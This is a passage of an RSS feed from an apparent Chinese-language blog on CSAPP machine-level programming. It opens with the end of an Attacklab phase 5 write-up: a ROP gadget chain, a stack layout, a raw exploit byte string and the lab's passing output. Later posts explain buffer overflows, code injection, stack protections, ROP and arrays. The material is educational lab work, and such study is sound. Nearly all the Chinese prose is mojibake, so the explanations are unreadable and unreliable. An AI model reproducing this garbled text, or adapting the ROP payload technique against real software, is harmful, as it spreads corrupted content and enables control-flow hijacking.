&lt;p&gt;å¦‚ä½•åœ¨æ ˆç©ºé—´ä¸­è¿ç»­å­˜æ”¾å­—ç¬¦ä¸²å‘¢?æˆ‘æ³¨æ„åˆ°farm.cæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ª &lt;code&gt;add_xy&lt;/code&gt;å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;longÂ add_xy(longÂ x,Â longÂ y)  
{  
Â Â Â Â returnÂ x+y;  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è®¡ç®—å­—ç¬¦ä¸²å­˜æ”¾çš„ä½ç½®ç›¸å¯¹äº%rspçš„åç§»é‡
è®¾è®¡gadget:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget 1:    # 0x401a06
	movq    %rsp,%rax
	ret

gadget 2:    # 0x4019a2
	movq    %rax,%rdi
	ret
# ä»¥ä¸Š,å°†%rspå¤„çš„å€¼å¤åˆ¶ç»™äº†%rdi

gadget 3:    # 0x4019ab
	pop    %rax
	ret

gadget 4:    # 0x4019dd
	movl    %eax,%edx
	ret

gadget 5:    # 0x401a34
	cmpb    %cl,cl
	movl    %edx,%ecx
	ret

gadget 6:    # 0x401a13
	movl    %ecx,%esi
# ä»¥ä¸Š,å°†åç§»é‡ä¼ ç»™%esi.æˆ‘æœ¬æ¥æ˜¯è¦ç›¸å‡çš„,ä½†çªç„¶æƒ³èµ·æ¥movlä¼šå°†é«˜ä½å…¨éƒ¨è®¾ç½®æˆ0,è¡Œä¸é€šäº†,åªèƒ½å‘ä¸Šæ–¹åç§».

gadget 7:    # 0x4019d6
	lea    (%rdi,%rsi,1),%rax
	ret

gadget 8:    # 0x4019a2
	movq    %rax,%rdi
	ret
# ä»¥ä¸Š,å°†å­—ç¬¦ä¸²æŒ‡é’ˆä¼ é€’ç»™%rdi
 touch3 address:0x4018fa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¦†å†™ &lt;code&gt;getbuf&lt;/code&gt;å‡½æ•°çš„è¿”å›åœ°å€ä¸ºgadget address 1,ä¹‹ä¸Šä¸ºgadget address 2,ä»¥æ­¤ç±»æ¨,
æ ˆç©ºé—´åº”è¯¥ä¸º&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;æ ˆç©ºé—´&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;å¡«å……&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;å¤‡æ³¨&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launchå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x35 0x39...&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;cookie string&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4018fa&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;touch3 address&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019a2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019d6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401a13&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401a34&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019dd&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0x48&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;åç§»é‡&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019ab&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019a2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;æ‰§è¡Œgadget 1æ—¶çš„%rsp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(testå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401a06&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuffå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40å­—èŠ‚buffer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;ä»»æ„å¡«å……å­—ç¬¦&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;æ ¹æ®ä»¥ä¸Šè®¾è®¡,å¡«å……çš„å­—ç¬¦ä¸²ä¸º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase5 */
ff ff ff ff ff ff ff ff ff ff                               
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff    
ff ff ff ff ff ff ff ff ff ff
/* ä»¥ä¸Šå…±40å­—èŠ‚ */
06 1a 40 00 00 00 00 00 /* gadget address 1 */
a2 19 40 00 00 00 00 00 /* gadget address 2 */
ab 19 40 00 00 00 00 00 /* gadget address 3 */
48 00 00 00 00 00 00 00 /* åç§»é‡:8*9 */
dd 19 40 00 00 00 00 00 /* gadget address 4 */
34 1a 40 00 00 00 00 00 /* gadget address 5 */
13 1a 40 00 00 00 00 00 /* gadget address 6 */
d6 19 40 00 00 00 00 00 /* gadget address 7 */
a2 19 40 00 00 00 00 00 /* gadget address 8 */
fa 18 40 00 00 00 00 00 /* touch3 address */
35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤§åŠŸå‘Šæˆ!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./rtarget -qi Phase5-raw
Cookie: 0x59b997fa
Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;æ€»ç»“&lt;/h1&gt;
&lt;p&gt;æˆ‘çœ‹ç½‘ä¸Šä¸å°‘åæ ¡çš„å­¦ç”Ÿéƒ½ç„¦å¤´çƒ‚é¢çš„å®éªŒ,æˆ‘ç‹¬ç«‹å®Œæˆ,çœŸæ˜¯å¤©æ‰å¦‚æˆ‘.åªè§‰å¾—CTFçš„ä»€ä¹ˆé€†å‘,pwn,ä¹Ÿä¸è¿‡å¦‚æ­¤.&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Thu, 23 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æœºå™¨çº§ç¼–ç¨‹V(è¿›é˜¶)</title><link>https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bv%E8%BF%9B%E9%98%B6/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bv%E8%BF%9B%E9%98%B6/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bv%E8%BF%9B%E9%98%B6/&quot;&gt;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bv%E8%BF%9B%E9%98%B6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;x86-64 Linuxå†…å­˜æ’åˆ—&lt;/h1&gt;
&lt;p&gt;è™½ç„¶64ä½æœºå™¨å¯ä»¥è®¿é—®2^ 64çš„åœ°å€,ä½†æ˜¯è¿™è¿œè¿œè¶…è¿‡äº†ç›®å‰çš„ç¡¬ä»¶æ°´å¹³.å®é™…ä¸Šç°åœ¨64ä½æœºå™¨ä¼šé™åˆ¶åªæ˜¯ç”¨47ä½çš„åœ°å€.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123162831.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ ˆ(Stack):æœ€å¤§8MB,ç”¨ &lt;code&gt;ulimit -a&lt;/code&gt;å‘½ä»¤å¯ä»¥æŸ¥çœ‹&lt;/li&gt;
&lt;li&gt;å †(Heap):è°ƒç”¨alloc()å‡½æ•°æ—¶åŠ¨æ€åˆ†é…&lt;/li&gt;
&lt;li&gt;æ•°æ®(Data):å›ºå®šåˆ†é…çš„æ•°æ®,å…¨å±€å˜é‡&lt;/li&gt;
&lt;li&gt;å…±äº«åº“(Share Libraries)/æ–‡æœ¬(Text):å¯æ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤,åªè¯».ç¨‹åºæ‰§è¡Œæ—¶ä¼š&lt;strong&gt;åŠ¨æ€åŠ è½½&lt;/strong&gt;åº“å‡½æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;char big_array[1L&amp;lt;&amp;lt;24]; /* 16 MB */ 
char huge_array[1L&amp;lt;&amp;lt;31]; /* 2 GB */ 
int global = 0; 

int useless() { return 0; } 
int main () { 
	void *p1, *p2, *p3, *p4; 
	int local = 0; 
	p1 = malloc(1L &amp;lt;&amp;lt; 28); /* 256 MB */ 
	p2 = malloc(1L &amp;lt;&amp;lt; 8); /* 256 B */ 
	p3 = malloc(1L &amp;lt;&amp;lt; 32); /* 4 GB */ 
	p4 = malloc(1L &amp;lt;&amp;lt; 8); /* 256 B */ 
	/* Some print statements ... */ 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶,å¯ä»¥è§‚å¯Ÿåˆ°
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123163815.png&quot; alt=&quot;&quot;&gt;
å°çš„æ•°ç»„åœ°å€ä½,å¤§çš„æ•°ç»„åœ°å€é«˜.ä¸­é—´çš„åŒºåŸŸå³ä½¿è¿˜æœªè¢«åˆ†é…,ä¾ç„¶è§†ä¸ºå †çš„ä¸€éƒ¨åˆ†,å¼•ç”¨å®ƒä¼šäº§ç”Ÿ Segmentation Fault.
å¦‚æœä¸Šä¸‹ä¸¤å—ç›¸é‡,allocå‡½æ•°å†ä¹Ÿæ— æ³•åˆ†é…å†…å­˜,å°±ä¼šåˆ†é…å¤±è´¥è¿”å›ç©ºæŒ‡é’ˆ.
æ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿå¯¹å“ªäº›å†…å­˜å¯¹åº”ç¨‹åºçš„å“ªä¸€éƒ¨åˆ†æœ‰ä¸€ä¸ªå¤§æ¦‚çš„å°è±¡,åœ¨åšbomblabå®éªŒæ—¶,æˆ‘ä¹Ÿæ³¨æ„åˆ°,0x7fff...æ˜¯æ ˆç©ºé—´,0x40...æ˜¯å‡½æ•°ä½“,0x60...æ˜¯ä¸€äº›å˜é‡.&lt;/p&gt;
&lt;h1&gt;ç¼“å†²åŒºæº¢å‡º&lt;/h1&gt;
&lt;p&gt;åœ¨å­¦ä¹ Cè¯­è¨€çš„è¿‡ç¨‹ä¸­æˆ‘å·²ç»äº†è§£åˆ°æœ‰ä¸€äº›å¤„ç†å­—ç¬¦ä¸²çš„å‡½æ•°æ˜¯ä¸å®‰å…¨çš„,æ²¡æœ‰è¾¹ç•Œæ£€æŸ¥.æ¯”å¦‚ &lt;code&gt;gets()&lt;/code&gt;  &lt;code&gt;*scanf()&lt;/code&gt; &lt;code&gt;strcat()&lt;/code&gt; å‡½æ•°ç­‰ç­‰.&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰ä¸€ä¸ªä¸å®‰å…¨çš„å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void echo() { 
	char buf[4]; /* Way too small! */ 
	gets(buf); 
	puts(buf); 
}

void call_echo(){
	echo();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªå‡½æ•°æ™ºèƒ½å­˜å‚¨3ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸².ä¸è¿‡å®é™…ä¸Šè¾“å…¥å¤§äº3ä¸ªæ—¶ä¹Ÿä¸ä¼šç«‹å³å´©æºƒ,è¦çœ‹ç¼–è¯‘å™¨ç”Ÿæˆçš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;echo:
	sub    $0x18, %rsp
	mov    %rsp, %rdi
	callq  &amp;lt;gets&amp;gt;
	mov    %rsp, %rdi
	callq  &amp;lt;puts&amp;gt;
	add    $0x18, %rsp
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥ç¼–è¯‘å™¨å®é™…ä¸Šç»™æ ˆåˆ†é…äº†24å­—èŠ‚çš„ç©ºé—´,èƒ½å¤Ÿå®¹çº³é•¿åº¦23çš„å­—ç¬¦ä¸².ä¸€æ—¦å­—ç¬¦ä¸²å¤šäº23ä¸ªå­—ç¬¦,å°±ä¼šæŠŠ&lt;code&gt;call_echo&lt;/code&gt;å‡½æ•°æ ˆå¸§çš„è¿”å›åœ°å€è¦†ç›–æ‰.å½“ &lt;code&gt;echo()&lt;/code&gt;å‡½æ•°æ‰§è¡Œå®Œæ¯•å,è·³è½¬åˆ°è¿”å›åœ°å€å°±åˆ°åˆ«çš„åœ°æ–¹å»äº†,ä»è€Œå¼•å‘æ— æ³•é¢„æ–™çš„è¡Œä¸º,ç¨‹åºå´©æºƒ.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123170310.png&quot; alt=&quot;&quot;&gt; =&amp;gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123170512.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;ä»£ç æ³¨å…¥æ”»å‡»&lt;/h2&gt;
&lt;p&gt;åˆ©ç”¨è¿™ä¸ªç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´,å¯ä»¥è¿›è¡Œä»£ç æ³¨å…¥æ”»å‡»&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¾“å…¥å­—ç¬¦ä¸²åŒ…æ‹¬è½¬æ¢æˆå­—èŠ‚å½¢å¼çš„æŒ‡ä»¤&lt;/li&gt;
&lt;li&gt;è¦†ç›–è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘æ³¨å…¥çš„ä»£ç 
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123171356.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;é¿å…ç¼“å†²åŒºæº¢å‡ºæ”»å‡»&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨ä»£ç å±‚é¢å¢å¼ºå¥å£®æ€§
é¿å…ä½¿ç”¨ä¸å®‰å…¨çš„å‡½æ•°:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨ &lt;code&gt;fgets()&lt;/code&gt; æ›¿ä»£ &lt;code&gt;gets()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç”¨ &lt;code&gt;strncpy()&lt;/code&gt; æ›¿ä»£ &lt;code&gt;strcpy()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åœ¨ &lt;code&gt;*scanf()&lt;/code&gt;çš„&lt;code&gt;%s&lt;/code&gt;å‰åŠ ä¸Šæ•°å­—é™åˆ¶æœ€å¤§è¯»å–é•¿åº¦&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;ç³»ç»Ÿçº§ä¿æŠ¤&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;æ ˆéšæœºåŒ–(ASLR:Address Space Layout Randomization)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¨‹åºå¼€å§‹æ—¶,åœ¨æ ˆä¸Šåˆ†é…ä¸€ä¸ªéšæœºå¤§å°çš„ç©ºé—´&lt;/li&gt;
&lt;li&gt;æ•´ä¸ªç¨‹åºçš„æ ˆåœ°å€éšä¹‹åç§»&lt;/li&gt;
&lt;li&gt;æ”»å‡»è€…æ›´éš¾æ„é€ è¿”å›åœ°å€
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123172651.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¸å¯æ‰§è¡Œä»£ç æ ‡è®°
  é€šè¿‡å°†å †æ ˆæ ‡è®°ä¸º&lt;strong&gt;ä¸å¯æ‰§è¡Œçš„&lt;/strong&gt;,èƒ½å¤Ÿé¿å…è¿™ç§æ”»å‡»æ–¹å¼&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;é‡‘ä¸é›€(Canary)ä¿æŠ¤æœºåˆ¶
Bomblabçš„[[Bomblab#phase_5|phase_5]]ä¸­å‡ºç°è¿‡
åœ¨gccä¸­æ·»åŠ ç¼–è¯‘é€‰é¡¹
&lt;code&gt;gcc&lt;/code&gt;
&lt;code&gt; -fstack-protector&lt;/code&gt;: å¯ç”¨ä¿æŠ¤,åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰charæ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤(é»˜è®¤å¼€å¯)
&lt;code&gt; -fstack-protector-all&lt;/code&gt;: å¯ç”¨ä¿æŠ¤,ä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç 
&lt;code&gt; -fno-stack-protector&lt;/code&gt;: ç¦ç”¨ä¿æŠ¤
åŠ å…¥äº†æ ˆä¿æŠ¤å&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86-64asm&quot;&gt;echo:
	sub    $0x18, %rsp

	mov    %fs:0x28, %rax
	mov    %rax, 0x8(%rsp)

	mov    %rsp, %rdi
	callq  &amp;lt;gets&amp;gt;
	mov    %rsp, %rdi
	callq  &amp;lt;puts&amp;gt;

	mov    0x8(%rsp), %rax
	xor    %fs:0x28, %rax
	je     .notoverflow
	callq  &amp;lt;__stack_chk_fail@plt&amp;gt;
	
.notoverflow:
	add    $0x18, %rsp
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·,ç¨‹åºå°†ä¸€ä¸ªéšæœºçš„cookiesæ”¾åœ¨äº†%rsp+8çš„åœ°å€ä¸Š,å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦å¤§äºç­‰äº8,è¦†ç›–åˆ°äº†è¿™ä¸ªéšæœºæ•°,ç¨‹åºè¿”å›ä¹‹å‰çš„æ£€æŸ¥å°±ä¸èƒ½é€šè¿‡.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123175437.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;é¢å‘è¿”å›çš„ç¼–ç¨‹æ”»å‡»(Return-Oriented Programming Attack)&lt;/h2&gt;
&lt;p&gt;ç³»ç»Ÿçº§ä¿æŠ¤(æ ˆéšæœºåŒ–/ä¸å¯çŸ¥æ€§æ ‡è®°)ç»™æ”»å‡»æå‡äº†éš¾åº¦,ä½†æ˜¯ç°æœ‰ä»£ç /åº“å‡½æ•°æ˜¯å¯æ‰§è¡Œçš„.
ROPåˆ©ç”¨ç°æœ‰ä»£ç ,éœ€è¦æ ˆæº¢å‡ºæ¼æ´,æ²¡æœ‰å…‹æœcanaryä¿æŠ¤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸€éƒ¨åˆ†æœ‰äº›éš¾ç†è§£&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ç›®å‰æš‚æ—¶çš„ç†è§£(ä¸ä¸€å®šæ­£ç¡®,éœ€è¦å»åšAttacklabè¿›ä¸€æ­¥å­¦ä¹ )æ˜¯,é€šè¿‡æ ˆæº¢å‡ºè¦†ç›–äº†å¤šä¸ªè¿”å›åœ°å€,æ¯ä¸ªè¿”å›åœ°å€æŒ‡å‘äº†æ”»å‡»è€…æŠ½å–çš„gadget.ä¸€ç³»åˆ—gadgetéƒ½ä»¥retç»“å°¾,ä½¿å¾—gadgetèƒ½å¤Ÿè¿æˆæŒ‡ä»¤åºåˆ—.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250123185428.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æŠ½å–gadgetæ„å»ºç¨‹åº:æŒ‡ä»¤åºåˆ—ä»¥ &lt;code&gt;ret&lt;/code&gt; ç»ˆæ­¢(0xc3)&lt;ul&gt;
&lt;li&gt;ç°æœ‰å‡½æ•°çš„ç»“å°¾&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;4004d0 &amp;lt;ab_plus_c&amp;gt;:
	4004d0:    48 0f af fe
	4004d4:    48 8d 04 17
	4004d8:    c3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœgadgetåœ°å€å–0x4004d4,ä¼šæ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	lea    (%rdi,%rdx,1), %rax
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™å°±æ˜¯å«æœ‰ä¸€å®šåŠŸèƒ½å’Œretçš„gadget.
	- ä»»ä½•äºŒè¿›åˆ¶ç‰‡æ®µ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;&amp;lt;setval&amp;gt;:
	4004d9:    c7 07 d4 48 89 c7
	4004df:    c3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœgadgetåœ°å€å–0x4004dc,åˆšå¥½æˆªå–&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	movl    %rax, %rdi
	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™å°±æ˜¯å«æœ‰ä¸€å®šåŠŸèƒ½å’Œretçš„gadget.&lt;/p&gt;
&lt;h1&gt;è”åˆä½“(Union)&lt;/h1&gt;
&lt;p&gt;Cè¯­è¨€ä¸­,ç»“æ„ä½“ä¼šä¸ºæ¯ä¸ªå­—æ®µåˆ†é…å•ç‹¬çš„å­˜å‚¨ç©ºé—´;è€Œè”åˆä½“ä½¿ç”¨å ç©ºé—´æœ€å¤§çš„å­—æ®µçš„å¤§å°æ¥åˆ†é…å†…å­˜,æ™ºèƒ½å­˜å‚¨ä¸€ä¸ªå­—æ®µçš„å€¼.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;union U1 { 
	char c; 
	int i[2]; 
	double v; 
} *up;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250124174011.png&quot; alt=&quot;&quot;&gt;
å¯¹ä¸€ä¸ªå­˜æœ‰æ•°æ®çš„è”åˆä½“è¯»å–ä¸åŒå­—æ®µçš„ç»“æ„å–å†³äºå°ç«¯åºå’Œå¤§ç«¯åº.&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Tue, 21 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æœºå™¨çº§ç¼–ç¨‹IV(æ•°æ®)</title><link>https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biv%E6%95%B0%E6%8D%AE/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biv%E6%95%B0%E6%8D%AE/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biv%E6%95%B0%E6%8D%AE/&quot;&gt;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Biv%E6%95%B0%E6%8D%AE/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;ä¹‹å‰è®¨è®ºçš„æ•°æ®ç±»å‹éƒ½æ˜¯æ•´å‹,è¿™éƒ¨åˆ†æ˜¯å°†å¤šä¸ªæ•°æ®å…ƒç´ èšåˆåœ¨ä¸€èµ·.&lt;/p&gt;
&lt;h1&gt;æ•°ç»„&lt;/h1&gt;
&lt;h2&gt;æ•°ç»„åˆ†é…ç©ºé—´&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;	ElemType A[L];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å†…å­˜ä¸­è¿ç»­åˆ†é… L * sizeof(ElemType) å­—èŠ‚çš„ç©ºé—´.&lt;/p&gt;
&lt;h2&gt;è¯»å–æ•°ç»„&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define ZLEN 5
typedef int zip_dig[ZLEN];

int get_digit(zip_dig z, int digit){
	return z[digit];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	# %rdi = z
	# %rsi = digit
	movl    (%rdi,%rsi,4), %eax      # z[digit] = *(%rdi + %rsi*4)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ä¿®æ”¹æ•°ç»„&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void zincr(zip_dig z){
	size_t i;
	for(i = 0;i &amp;lt; ZLEN;i++)
		z[i]++;
} // å¯¹æ•°ç»„çš„æ¯ä¸ªå…ƒç´ åŠ 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;    # %rdi = z
    movl    $0, %eax               # i = 0
    jmp     .L3
.L4:
	addl    $1, (%rdi, %rax, 4)    # z[i]++
	addq    $1, %rax               # i++
.L3:
	cmp    $4, %rax                # å¾ªç¯æ¡ä»¶åˆ¤æ–­
	jbe    .L4
	rep; ret
